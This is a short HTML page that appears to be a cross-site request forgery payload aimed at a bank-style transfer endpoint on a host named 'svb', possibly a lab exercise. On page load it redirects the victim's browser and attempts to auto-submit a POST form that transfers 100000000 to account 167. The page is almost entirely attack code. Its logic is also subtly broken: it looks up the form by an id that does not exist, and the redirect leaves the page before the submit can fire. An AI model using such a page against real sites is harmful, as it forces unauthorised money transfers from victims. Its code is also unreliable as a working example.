    <!DOCTYPE html>
<html>
<head>
	<title>Redirect and Submit Form</title>
	<script>
		window.onload = function() {
			// Redirect to another site
			window.location.href = "http://svb:5003/transfer/1";
			
			// Wait for the redirect to complete, then submit the form
			setTimeout(function() {
				document.getElementById("transferForm").submit();
			}, 5000); // 5 seconds delay before submitting the form
		}
	</script>
</head>
<body>
        <form method="POST" action="/transfer/1" name="transferForm">
            <div class="field">
                <div class="control">
                    <input class="input is-large" type="text" name="account" value="167">
                </div>
            </div>
            <div class="field">
                <div class="control">
                    <input class="input is-large" type="text" name="amount" value="100000000">
                </div>
            </div>
            <button class="button is-block is-info is-large is-fullwidth">Transfer</button>
        </form>	
</body>
</html>
